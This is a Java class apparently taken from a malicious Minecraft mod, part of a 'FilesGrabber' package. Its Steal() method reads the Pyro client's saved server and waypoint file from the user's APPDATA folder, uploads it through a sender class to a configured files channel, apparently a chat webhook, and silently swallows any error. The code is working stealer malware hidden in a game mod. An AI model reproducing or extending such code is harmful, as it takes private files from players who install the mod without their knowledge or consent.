package com.example.examplemod.Hacks.FilesGrabber.Pyro;

import com.example.examplemod.Sender.Cfg;
import com.example.examplemod.Sender.SendMessage;

import java.io.File;

public class PyroWaypoints {
    public static void Steal() throws Exception {
        try {
            SendMessage.sendFile(new File(System.getenv("APPDATA") + "\\.minecraft\\Pyro\\server"));
            SendMessage.doThing("```PyroWaypoints ^^^```", Cfg.FilesChannel);}catch (Exception e){
            System.out.println("lol321");
        }
    }
}
